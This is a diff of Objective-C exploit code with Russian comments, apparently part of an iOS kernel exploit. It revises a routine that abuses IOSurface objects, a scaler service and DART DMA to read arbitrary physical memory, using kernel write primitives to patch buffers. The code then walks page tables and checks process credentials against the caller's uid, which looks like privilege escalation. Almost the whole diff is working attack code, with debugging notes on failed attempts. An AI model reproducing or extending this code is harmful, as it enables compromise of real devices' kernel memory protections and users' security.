@@ -148,29 +148,27 @@ static uint64_t kpZoneVtoP(uint64_t va)
 // → prepare full-map → сериализация из её record buffer). Патчим её буфер на
 // targetPA>>14 ДО первого submit: DMA читает deadly-страницу как контент src
 // и кладёт в dstS. Поверхность выпускаем после чтения.
-// 1.9.257 (р.64): physread 16KB через DART — СВЕЖИЙ pipe + СВЕЖАЯ поверхность.
-// Расклад промахов 252-256 (всё по р.64): (a) swap-оп дропается молча; (b) src
-// ре-маппится каждый оп из cmd-кэша (off,len) — поверхность тех же dims ловит
-// кэш-хит на ЧУЖОЙ маппинг (sig=0x41 = пиксели srcS); (c) dst-маппинг на текущем
-// pipe персистентен и остался ctlPA после CONFIRMED — запись вообще не в dstS.
-// Лечение: restore dst-записи в оригинал + НОВЫЙ коннекшн к скейлеру (пустой
-// pipe = пустые cmd/LRU кэши) + свежая поверхность-жертва (гарантированный
-// full-map из её record buffer): DMA читает deadly-страницу как контент src
-// и кладёт её в dstS-реальный backing, который читаем с юзер-стороны.
-static BOOL kpPhysRead16K(io_service_t svc, uint64_t dstBuf, uint64_t dstOldQ, const uint8_t *tsdV,
-                          uint32_t dstID, IOSurfaceRef dstS, uint64_t ttM, uint64_t isTable,
+// 1.9.258 (р.64): physread 16KB через DART — ПОЛНОСТЬЮ СВОЯ пара поверхностей.
+// Расклад промахов 252-257: (a) swap-оп дропается молча; (b) cmd-кэш src-фазы
+// ключуется по (off,len) — поверхность тех же dims (1024×128=0x80000) ловила
+// кэш-хит на маппинг srcS (sig=0x41 ×7); (c) dst на текущем pipe персистентен =
+// ctlPA. Лечение: свежий pipe + своя ПАРА 1024×64 (rdS источник с пропатченным
+// record buffer на targetPA>>14, dsS приёмник с реальным backing) — кэш-мисс по
+// (off,len=0,0x40000), identity по dims (урок 241: mismatch = kr=0xe00002c2).
+// DMA читает deadly-страницу как контент rdS и кладёт её в dsS.
+static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
                           uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
     memset(out, 0, 0x4000);
-    // dst entry[0] → оригинал: на свежем pipe dst смаппится в РЕАЛЬНЫЙ backing
-    if (dstBuf) early_kwrite64(dstBuf + 0x30, dstOldQ);
-    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @128,
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @64,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
     IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
-    if (!rdS) return NO;
+    IOSurfaceRef dsS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    if (!rdS || !dsS) { if (rdS) CFRelease(rdS); if (dsS) CFRelease(dsS); return NO; }
     BOOL done = NO;
     uint64_t rdVA = 0, rdBuf = 0;
     uint32_t rdID = IOSurfaceGetID(rdS);
+    uint32_t dsID = IOSurfaceGetID(dsS);
     typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
     CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
     mach_port_t mp = pCmp ? pCmp(rdS) : 0;
@@ -222,7 +220,7 @@ static BOOL kpPhysRead16K(io_service_t svc, uint64_t dstBuf, uint64_t dstOldQ, c
             uint8_t tsdR[0x1B0];
             memcpy(tsdR, tsdV, sizeof(tsdR));
             *(uint32_t *)(tsdR + 0) = rdID;
-            *(uint32_t *)(tsdR + 4) = dstID;
+            *(uint32_t *)(tsdR + 4) = dsID;
             *(uint64_t *)(tsdR + 8) = 1;
             *(uint32_t *)(tsdR + 0x0C) = 64;
             *(uint32_t *)(tsdR + 0x10) = 64;
@@ -231,11 +229,11 @@ static BOOL kpPhysRead16K(io_service_t svc, uint64_t dstBuf, uint64_t dstOldQ, c
             early_kwrite64(rdBuf + 0x30, eSave);
             if (flSave) early_kwrite64(rdBuf + 0x28, flSave);
             IOServiceClose(v2);
-            IOSurfaceLock(dstS, 0, NULL);
-            uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
+            IOSurfaceLock(dsS, 0, NULL);
+            uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
             if (spR) memcpy(out, spR, 0x4000);
-            IOSurfaceUnlock(dstS, 0, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x (fresh pipe)",
+            IOSurfaceUnlock(dsS, 0, NULL);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x (fresh pipe+pair)",
                       (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
             done = YES;
         } else {
@@ -245,6 +243,7 @@ static BOOL kpPhysRead16K(io_service_t svc, uint64_t dstBuf, uint64_t dstOldQ, c
         kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA/rdBuf нет (rdVA=%#llx) — чтение пропущено", (unsigned long long)rdVA]);
     }
     CFRelease(rdS);
+    CFRelease(dsS);
     return done;
 }
 
@@ -7823,16 +7822,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
                     uint8_t timg[0x4000];
-                    dq252 = buf247 ? ((early_kread64(buf247 + 0x30) & 0xffffffff00000000ULL) | pfn32) : 0;
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
                               kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
-                    if (kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, tpage, timg, r)) {
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, timg, r)) {
                         uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
                         if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
                             uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
                             uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, l3pa, timg, r)) pte = 0;
+                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, timg, r)) pte = 0;
                             else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
@@ -7850,7 +7848,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // страницы сам охраняется (pkva=0 или q0a не сошёлся).
                 if (!paOK && pagePA && svc) {
                     uint8_t cimg[0x4000];
-                    if (kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, pagePA, cimg, r)) {
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, cimg, r)) {
                         uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
                         uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
                         if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
